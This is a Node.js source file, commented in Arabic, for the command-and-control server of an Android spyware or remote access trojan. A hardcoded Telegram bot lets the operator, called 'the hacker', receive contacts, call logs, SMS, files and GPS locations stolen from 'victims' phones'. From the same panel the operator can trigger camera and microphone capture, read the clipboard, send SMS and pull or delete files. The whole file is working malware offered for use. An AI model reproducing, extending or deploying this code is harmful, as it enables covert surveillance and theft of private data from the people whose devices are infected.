// استيراد المكتبات الأساسية المطلوبة للتشغيل
const WebSocket = require('ws');
const http = require('http');
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');

// إعداد بيئة العمل والمكتبات
const upload = multer();
const app = express();
app.use(bodyParser.json());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// بيانات التحكم الخاصة بالمخترق (توكن البوت ومعرف الشات)
const chatId = '5474851558';
const token = '8834018446:AAFY9OmJ22qOeswwcTLsi1yTuafIWJzv41o';
const serverAddr = ''; // عنوان السيرفر لإبقائه نشطاً (إذا وجد)

// إنشاء كائن البوت الخاص بتليجرام وتفعيل خاصية جلب البيانات المستمر
const bot = new TelegramBot(token, { polling: true });

// ----------------- مسارات الاستقبال (Endpoints) -----------------

// مسار فحص حالة السيرفر الأساسية
app.get('/', (req, res) => {
    res.send('كل شيء يعمل بشكل صحيح الآن، يرجى تعديل كود الـ APK المصدري');
});

// مسار استقبال الملفات المرفوعة من هاتف الضحية (مثل التسجيلات الصوتية، الصور، الملفات)
app.post('/sendFile', upload.single('file'), (req, res) => {
    const filename = req.file.originalname;
    
    // إرسال الملف المستلم كوثيقة إلى البوت في تليجرام
    bot.sendDocument(chatId, req.file.buffer, {}, { filename: filename, contentType: 'application/txt' })
        .then(() => {
            console.log(`تم بنجاح إرسال الملف: ${filename}`);
        })
        .catch((err) => {
            console.log('حدث خطأ أثناء إرسال الملف:', err);
        });
        
    res.send(filename);
});

// مسار استقبال النصوص (مثل جهات الاتصال، سجل المكالمات، الرسائل النصية)
app.post('/sendText', (req, res) => {
    bot.sendMessage(chatId, req.body.data, { parse_mode: 'HTML' });
    res.send(req.body.data);
});

// مسار استقبال الموقع الجغرافي للضحية (GPS)
app.post('/sendLocation', (req, res) => {
    bot.sendLocation(chatId, req.body.l1, req.body.l2);
    res.send(req.body.l1.toString());
});

// تشغيل خادم الاستماع (HTTP Server) على منفذ مخصص أو المنفذ الافتراضي 8999
server.listen(process.env.PORT || 8999, () => {
    console.log('تم تشغيل الخادم بنجاح على المنفذ: ' + server.address().port);
});

// ----------------- إدارة اتصالات الضحايا (WebSockets) -----------------

// خريطة لتخزين عناوين الـ IP والموقع الجغرافي الأخير للمعرفات الثابتة لتفادي التكرار عند إعادة الاتصال
const activeDevices = new Map();

wss.on('connection', (ws, req) => {
    // 1. محاولة جلب المعرف الثابت المدمج في ترويسات الطلب من الـ APK (إن وجد)
    // تبحث هذه الخاصية عن معرّف العميل الممرر في الترويسات كـ Client-ID أو المعرف الممرر في معلمات الرابط
    const urlParams = new URL(req.url, 'http://localhost').searchParams;
    const clientUuid = req.headers['client-id'] || req.headers['sec-websocket-protocol'] || urlParams.get('id');

    // 2. الحفاظ على المعرف الثابت: إذا أرسل التطبيق معرفه الثابت نقوم باعتماده، وإلا نولد له معرفاً لمرة واحدة فقط
    if (clientUuid && clientUuid.trim() !== '') {
        ws.uuid = clientUuid.trim();
        console.log(`تأكيد اتصال جهاز بمعرف ثابت مسجل مسبقاً: ${ws.uuid}`);
    } else {
        ws.uuid = uuidv4();
        console.log(`تم توليد معرف مؤقت لجهاز جديد: ${ws.uuid}`);
    }
    
    // تنظيف وتنسيق عنوان الـ IP الخاص بجهاز الضحية
    const rawIp = req.socket.remoteAddress.toString();
    const cleanIp = rawIp.replaceAll('f', '').replaceAll(':', '');
    
    // 3. منع الإشعارات المكررة المزعجة في تليجرام عند انقطاع الشبكة وإعادة الاتصال السريع:
    // إذا كان المعرف مسجلاً لدينا مسبقاً وكان متصلاً مؤخراً بنفس الـ IP، لا نرسل إشعاراً جديداً للمخترق لتجنب إغراق المحادثة
    if (!activeDevices.has(ws.uuid) || activeDevices.get(ws.uuid) !== cleanIp) {
        activeDevices.set(ws.uuid, cleanIp);
        
        // إرسال إشعار فوري لمخترق عبر تليجرام عند اتصال ضحية جديدة أو تغيير الـ IP
        const notificationMsg = `<b>📱 تم اتصال ضحية جديدة بالشبكة\n\nالمعرف الفريد (ID) = <code>${ws.uuid}</code>\nعنوان الـ IP = ${cleanIp}</b> 🌐`;
        bot.sendMessage(chatId, notificationMsg, { parse_mode: 'HTML' });
    }

    // إدارة إنهاء الاتصال وتنظيف الذاكرة بشكل آمن
    ws.on('close', () => {
        console.log(`انقطع اتصال الجهاز: ${ws.uuid}`);
        // نترك المعرف مخزناً مؤقتاً في activeDevices لضمان استقرار الجلسة وتفادي الإشعار المكرر عند إعادة الاتصال الفورية
        setTimeout(() => {
            if (![...wss.clients].some(client => client.uuid === ws.uuid)) {
                activeDevices.delete(ws.uuid);
            }
        }, 10000); // تنظيف بعد 10 ثوانٍ من الانقطاع المستمر
    });

    ws.on('error', (err) => {
        console.log(`حدث خطأ في اتصال الجهاز ${ws.uuid}:`, err.message);
    });
});

// وظيفة دورية كل ثانيتين لإرسال نبضة "be alive" لجميع الأجهزة للحفاظ على بقائها نشطة
setInterval(() => {
    wss.clients.forEach((ws) => {
        try {
            if (ws.readyState === WebSocket.OPEN) {
                ws.send('be alive');
            }
        } catch (e) {
            console.log('فشل إرسال نبضة البقاء النشط للجهاز:', ws.uuid);
        }
    });
}, 2000);

// ----------------- إدارة أوامر تليجرام (Telegram Commands) -----------------

bot.on('message', (msg) => {
    // التأكد من أن الرسالة نصية
    if (!msg.text) return;

    // عند إرسال أمر البدء /start
    if (msg.text === '/start') {
        const welcomeText = "مرحباً بك في لوحة التحكم.\n\nيرجى الاشتراك في القناة لضمان استقرار العمل بدون مشاكل:\nhttps://t.me/xeon_bo";
        bot.sendMessage(chatId, welcomeText, {
            reply_markup: {
                keyboard: [
                    ['حالة الاتصال ⚙'],
                    ['لوحة التحكم ☄']
                ],
                resize_keyboard: true
            }
        });
    }

    // زر "حالة الاتصال ⚙" لمعرفة عدد الأجهزة المتصلة حالياً
    if (msg.text === 'حالة الاتصال ⚙') {
        const onlineCount = wss.clients.size;
        let replyMsg = "";
        
        if (onlineCount > 0) {
            replyMsg += `<b>عدد الأجهزة المتصلة حالياً: ${onlineCount}</b> ✅\n\n`;
            wss.clients.forEach((ws) => {
                replyMsg += `<b>المعرف (ID) => </b><code>${ws.uuid}</code>\n\n`;
            });
        } else {
            replyMsg += "<b>لا توجد أي أجهزة متصلة بالإنترنت حالياً ❌</b>\n\nتواصل مع: @name_dark";
        }
        
        bot.sendMessage(chatId, replyMsg, { parse_mode: 'HTML' });
    }

    // زر "لوحة التحكم ☄" لعرض الأزرار التفاعلية لكل ضحية
    if (msg.text === 'لوحة التحكم ☄') {
        if (wss.clients.size > 0) {
            // الأزرار التفاعلية لإرسال الأوامر للهاتف
            const controlButtons = [
                [
                    { text: 'سجل المكالمات 📞', callback_data: 'cl' },
                    { text: 'جهات الاتصال 👤', callback_data: 'gc' }
                ],
                [
                    { text: 'الرسائل النصية المستلمة 💬', callback_data: 'as' },
                    { text: 'إرسال رسالة SMS 💬', callback_data: 'ss' }
                ],
                [
                    { text: 'التطبيقات المثبتة 📲', callback_data: 'ia' },
                    { text: 'معلومات الجهاز 📱', callback_data: 'dm' }
                ],
                [
                    { text: 'سحب ملف/مجلد 📄', callback_data: 'gf' },
                    { text: 'حذف ملف/مجلد 🗑', callback_data: 'df' }
                ],
                [
                    { text: 'الكاميرا الأساسية 📷', callback_data: 'cam1' },
                    { text: 'الكاميرا الأمامية 🤳', callback_data: 'cam2' }
                ],
                [
                    { text: 'الميكروفون 1 🎤', callback_data: 'mi1' },
                    { text: 'الميكروفون 2 🎤', callback_data: 'mi2' },
                    { text: 'الميكروفون 3 🎤', callback_data: 'mi3' }
                ],
                [
                    { text: 'محتوى الحافظة (الكليب بورد) 📄', callback_data: 'cp' }
                ]
            ];

            // إرسال لوحة التحكم لكل جهاز متصل بالشبكة حالياً
            wss.clients.forEach((ws) => {
                const deviceHeader = `<b>☄ اختر الإجراء المطلوب تنفيذه على الجهاز التالي:</b>\n&${ws.uuid}`;
                bot.sendMessage(chatId, deviceHeader, {
                    reply_markup: { inline_keyboard: controlButtons },
                    parse_mode: 'HTML'
                });
            });
        } else {
            bot.sendMessage(chatId, "<b>لا توجد أي أجهزة متصلة بالإنترنت حالياً ❌</b>", { parse_mode: 'HTML' });
        }
    }

    // معالجة الأوامر التي تتطلب رداً نصياً من المخترق (Reply)
    if (msg.reply_to_message) {
        const replyText = msg.reply_to_message.text;
        
        // إذا كان الرد على رسالة "إرسال SMS"
        if (replyText.split('&')[0] === 'ss') {
            const targetUuid = replyText.split('!')[0].split('[')[1]; // استخراج الـ UUID للضحية
            const smsCommand = msg.text; // نص الأمر المكتوب بصيغة JSON
            
            wss.clients.forEach((ws) => {
                if (ws.uuid === targetUuid && ws.readyState === WebSocket.OPEN) {
                    ws.send(`ss&${smsCommand}`); // إرسال الأمر للجهاز المتصل عبر الـ WebSocket
                }
            });
            
            bot.sendMessage(chatId, "طلبك قيد التنفيذ الآن.. يرجى الانتظار!", {
                reply_markup: {
                    keyboard: [
                        ['حالة الاتصال ⚙'],
                        ['لوحة التحكم ☄']
                    ]
                }
            });
        }

        // إذا كان الرد على رسالة سحب ملف (gf) أو حذف ملف (df)
        if (replyText.split('&')[0] === 'df' || replyText.split('&')[0] === 'gf') {
            const commandType = replyText.split('!')[0].split('&')[0]; // نوع الأمر (gf أو df)
            const targetUuid = replyText.split('!')[0].split('&')[1]; // استخراج الـ UUID
            const filePath = msg.text; // مسار الملف المطلوب
            
            wss.clients.forEach((ws) => {
                if (ws.uuid === targetUuid && ws.readyState === WebSocket.OPEN) {
                    ws.send(`${commandType}&${filePath}`); // إرسال الأمر للجهاز المتصل
                }
            });
            
            bot.sendMessage(chatId, "طلبك قيد التنفيذ الآن.. يرجى الانتظار!", {
                reply_markup: {
                    keyboard: [
                        ['حالة الاتصال ⚙'],
                        ['لوحة التحكم ☄']
                    ]
                }
            });
        }
    }
});

// ----------------- معالجة الضغط على أزرار لوحة التحكم التفاعلية -----------------

bot.on('callback_query', function onCallbackQuery(callbackQuery) {
    const action = callbackQuery.data; // الكود المختصر للأمر (مثال: cl, gc, ss...)
    
    // ✅ الحل وإصلاح المشكلة: إرسال رد فوري لتليجرام لإيقاف مؤشر التحميل الدوار ومنع التجميد والمنبثقات
    bot.answerCallbackQuery(callbackQuery.id).catch((err) => {
        console.log('حدث خطأ أثناء إرسال إشارة استلام نقرة الأزرار:', err);
    });

    // استخراج الـ UUID الخاص بالجهاز المستهدف من نص الرسالة التي تحتوي على الأزرار
    const targetUuid = callbackQuery.message.text.split('&')[1];

    wss.clients.forEach((ws) => {
        if (ws.uuid === targetUuid) {
            // إذا كان الإجراء هو إرسال رسالة SMS
            if (action === 'ss') {
                const promptMsg = `ss&${ws.uuid}!\n\n<b>إجراء إرسال رسالة نصية (SMS)\n🔵 يرجى الرد على هذه الرسالة بكتابة الرقم والرسالة بالصيغة البرمجية التالية:</b>\n<code>[{"number":"رقم الهاتف هنا","message":"نص الرسالة هنا"}]</code>`;
                bot.sendMessage(chatId, promptMsg, {
                    reply_markup: { force_reply: true },
                    parse_mode: 'HTML'
                });
            } 
            // إذا كان الإجراء هو سحب ملف أو مجلد
            else if (action === 'gf') {
                const promptMsg = `gf&${ws.uuid}!\n\n<b>إجراء جلب ملف أو مجلد\n🔵 يرجى الرد على هذه الرسالة بكتابة المسار الكامل للملف أو المجلد المطلوب:</b>`;
                bot.sendMessage(chatId, promptMsg, {
                    reply_markup: { force_reply: true },
                    parse_mode: 'HTML'
                });
            } 
            // إذا كان الإجراء هو حذف ملف أو مجلد
            else if (action === 'df') {
                const promptMsg = `df&${ws.uuid}!\n\n<b>إجراء حذف ملف أو مجلد\n🔵 يرجى الرد على هذه الرسالة بكتابة المسار الكامل للملف أو المجلد المراد حذفه:</b>`;
                bot.sendMessage(chatId, promptMsg, {
                    reply_markup: { force_reply: true },
                    parse_mode: 'HTML'
                });
            } 
            // لباقي الأوامر المباشرة (مثل تشغيل الكاميرا، الميكروفون، جلب جهات الاتصال)
            else {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.send(action); // إرسال الأمر مباشرة للهاتف عبر الـ WebSocket
                }
            }
        }
    });
});

// وظيفة لإبقاء السيرفر نشطاً (تجنباً لإغلاقه التلقائي من خدمات الاستضافة المجانية)
setInterval(() => {
    if (serverAddr) {
        axios.get(serverAddr).catch(() => {});
    }
}, 120000);
